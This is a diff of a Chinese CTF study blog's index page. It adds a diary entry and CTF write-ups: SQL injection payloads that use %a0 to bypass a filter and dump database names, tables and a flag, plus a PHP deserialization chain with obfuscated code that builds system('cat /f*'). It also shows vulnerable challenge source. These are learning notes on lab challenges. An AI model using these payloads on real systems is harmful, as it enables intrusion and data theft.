@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-count">76</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -140,7 +140,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-count">52</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -163,6 +163,342 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" class="post-title-link" itemprop="url">[NCTF 2018]滴!晨跑打卡</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-19 17:00:13 / 修改时间：17:57:03" itemprop="dateCreated datePublished" datetime="2025-02-19T17:00:13+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>154</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
+<p>FUZZ看屏蔽什么</p>
+<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+
+<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
+<blockquote>
+<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/" class="post-title-link" itemprop="url">永远追不上的时间</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-19 16:57:03 / 修改时间：17:05:21" itemprop="dateCreated datePublished" datetime="2025-02-19T16:57:03+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Index/" itemprop="url" rel="index"><span itemprop="name">Index</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>152</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>12.20下课</p>
+<p>13.00吃完麦当劳 走路回宿舍</p>
+<p>玩了一会儿手机，头不太舒服，睡了一会儿（本来只想咪到2点）</p>
+<p>15.00醒了，穿衣服，下楼洗澡</p>
+<p>15.40洗完了（没洗头所以不用吹头发）烧水，玩了五分钟NS</p>
+<p>16.10出门吃饭，瓦香鸡等了十分钟，</p>
+<p>16.57 到俱乐部，写博客</p>
+<p>实际上这已经是非常非常避开人流的作息了…如果不要求自己下午一定要来电脑面前一会儿就好很多…但是还有晚自习晚上只能学一个小时QAQ</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/" class="post-title-link" itemprop="url">NPC²CTF_部分WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-17 22:59:57" itemprop="dateCreated datePublished" datetime="2025-02-17T22:59:57+08:00">2025-02-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-24 22:37:13" itemprop="dateModified" datetime="2025-02-24T22:37:13+08:00">2025-02-24</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>166</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phone</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">please</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wake</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">up</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$d</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phone</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phone</span>();</span><br><span class="line"><span class="variable">$phone</span>-&gt;a = <span class="variable">$rce</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$wake</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wake</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">up</span>();</span><br><span class="line"><span class="variable">$dummy</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;a = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;b = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;c = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> <span class="title function_ invoke__">me</span>();</span><br><span class="line"><span class="variable">$me</span>-&gt;a = <span class="variable">$wake</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;b = <span class="variable">$up</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;c = [<span class="number">2</span> =&gt; [<span class="variable">$phone</span>, <span class="string">&#x27;test&#x27;</span>]];</span><br><span class="line"><span class="variable">$me</span>-&gt;d = <span class="string">&#x27;wakeup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$please</span> = <span class="keyword">new</span> <span class="title function_ invoke__">please</span>();</span><br><span class="line"><span class="variable">$please</span>-&gt;a = <span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$please</span>));<span class="comment">#这里要记得url编码QAQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$rce中是用于rce的代码，用自增、取反、异或构造出形如system()即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#汉字取反(感谢选手lzz0403 QAQ</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27; $_++;</span></span><br><span class="line"><span class="string">$__ = &quot;牥&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;獡&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;砏&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;盔&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;犤&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;璜&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;珟&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$____ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;疘&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;皕&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$______ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瘗&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$___($_____(&quot;/&quot;.$_______));</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#这是自增，记得去掉注释</span></span><br><span class="line"><span class="variable">$rce</span>=<span class="string">&#x27;$_=[];</span></span><br><span class="line"><span class="string">$_=@&quot;$_&quot;;</span></span><br><span class="line"><span class="string">$__=$_[&quot;[&quot;==&quot;]&quot;];</span></span><br><span class="line"><span class="string">$___=$_[&quot;[&quot;==&quot;[&quot;];</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;</span></span><br><span class="line"><span class="string">$____=$__^$___;</span></span><br><span class="line"><span class="string">$____--;</span></span><br><span class="line"><span class="string">$___=$_[$____];</span></span><br><span class="line"><span class="string">$____++;</span></span><br><span class="line"><span class="string">$_____=$___;#a</span></span><br><span class="line"><span class="string">$___++;$___++;#c</span></span><br><span class="line"><span class="string">$_____=$___.$_____;#ca</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;#f</span></span><br><span class="line"><span class="string">$______=&quot; /&quot;.$___.&quot;*&quot;;# /f*</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;#t</span></span><br><span class="line"><span class="string">$_____=$_____.$___;#cat</span></span><br><span class="line"><span class="string">$_____=$_____.$______;#cat /f*</span></span><br><span class="line"><span class="string">$__++;$__++;#C</span></span><br><span class="line"><span class="string">$__++;$__++;#E</span></span><br><span class="line"><span class="string">$________=$__;#E</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;#H</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;#M</span></span><br><span class="line"><span class="string">$________=$________.$__;#EM</span></span><br><span class="line"><span class="string">$__++;$__++;#O</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$_________=$__;#S</span></span><br><span class="line"><span class="string">$__++;</span></span><br><span class="line"><span class="string">$________=$__.$________;#TEM</span></span><br><span class="line"><span class="string">$________=$_________.$________;#STEM</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$________=$_________.$__.$________;#SYSTEM</span></span><br><span class="line"><span class="string">$________($_____);</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -897,9 +1233,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-02-13 17:03:33 / 修改时间：18:02:37" itemprop="dateCreated datePublished" datetime="2025-02-13T17:03:33+08:00">2025-02-13</time>
+      <time title="创建时间：2025-02-13 17:03:33" itemprop="dateCreated datePublished" datetime="2025-02-13T17:03:33+08:00">2025-02-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-04-10 13:46:46" itemprop="dateModified" datetime="2025-04-10T13:46:46+08:00">2025-04-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -932,7 +1274,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>0</span>
+      <span>341</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -950,460 +1292,21 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          
-      
-    </div>
+          <p>4.9 本人今天才正式明白反序列化在干嘛。</p>
+<h1 id="file-get-contents-与-data-协议"><a href="#file-get-contents-与-data-协议" class="headerlink" title="file_get_contents 与 data:&#x2F;&#x2F;协议"></a>file_get_contents 与 data:&#x2F;&#x2F;协议</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/BJDCTF-2020-easy-md5-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/13/BJDCTF-2020-easy-md5-1/" class="post-title-link" itemprop="url">[BJDCTF 2020]easy_md5</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2025-02-13 14:25:17 / 修改时间：14:28:14" itemprop="dateCreated datePublished" datetime="2025-02-13T14:25:17+08:00">2025-02-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/13/BJDCTF-2020-easy-md5-1/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/13/BJDCTF-2020-easy-md5-1/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>647</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>dir扫扫没头绪别管了看下wp</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-133501.png" class="" title="QQ20250213-133501">
-
-<p>原来我们的小提示在输入框的返回响应头里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
-
-<p>从名为 <code>&#39;admin&#39;</code> 的表中，选择所有列（<code>*</code>），但条件是密码字段的值必须等于一个通过 <code>md5</code> 函数加密后生成的密码。</p>
-<p>然后呢？密码呢？注入看看，好像不会，看看wp</p>
-<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3001">https://www.nssctf.cn/note/set/3001</a></p>
-<p>当‘ or ’ 后面的值为True是，就能构成万能密码，实现绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;true&#x27;</span><br></pre></td></tr></table></figure>
-
-<h4 id="补充知识点："><a href="#补充知识点：" class="headerlink" title="补充知识点："></a>补充知识点：</h4><p><strong>MySQL的一个特性：</strong></p>
-<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p>
-<p>要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。</p>
